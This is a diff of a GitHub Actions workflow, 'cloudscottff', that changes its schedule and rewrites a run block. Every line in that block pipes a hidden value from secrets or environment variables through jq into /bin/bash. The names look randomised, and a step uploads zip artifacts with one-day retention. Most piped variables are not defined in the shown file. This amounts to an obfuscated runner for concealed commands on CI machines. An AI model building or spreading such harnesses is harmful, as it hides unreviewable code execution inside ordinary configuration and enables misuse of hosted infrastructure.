@@ -1,10 +1,9 @@
 name: cloudscottff
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '14 0/6 * * *'
 
+  schedule:
+    - cron: '18 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: cloudscottff
         env:
-          ih1: ${{ secrets.ih1 }}
+          xpscv61066: ${{ secrets.xpscv61066 }}
         run: |
-          echo $ih1 | jq -r .q45 | /bin/bash
-          echo $ck8 | jq -r .lfm4703 | /bin/bash
-          echo $wce60509 | jq -r .y65488 | /bin/bash
-          echo $uhvt2 | jq -r .r6 | /bin/bash
-          echo $ah7 | jq -r .wcvp61 | /bin/bash
-          echo $hozt49 | jq -r .ezkmg80 | /bin/bash
-          echo $jh83 | jq -r .yj7763 | /bin/bash
-          echo $k677 | jq -r .r1448 | /bin/bash
-          echo $qjqey60340 | jq -r .wtfh6 | /bin/bash
+          printf '%s' "$xpscv61066" | jq -r .s592 | /bin/bash
+          printf '%s' "$gtuar93" | jq -r .vxq311 | /bin/bash
+          echo $xmva924 | jq -r .y39 | /bin/bash
+          printf '%s' "$mwp1" | jq -r .limm9236 | /bin/bash
+          echo $gcaz5 | jq -r .oh01 | /bin/bash
+          echo $omsf75 | jq -r .ni2687 | /bin/bash
+          printf '%s' "$xsxf424" | jq -r .q01314 | /bin/bash
+          echo $gqf7176 | jq -r .l63 | /bin/bash
+          echo $w2 | jq -r .e82 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kdYl82Pt
+          path: "*.zip"
+          retention-days: 1
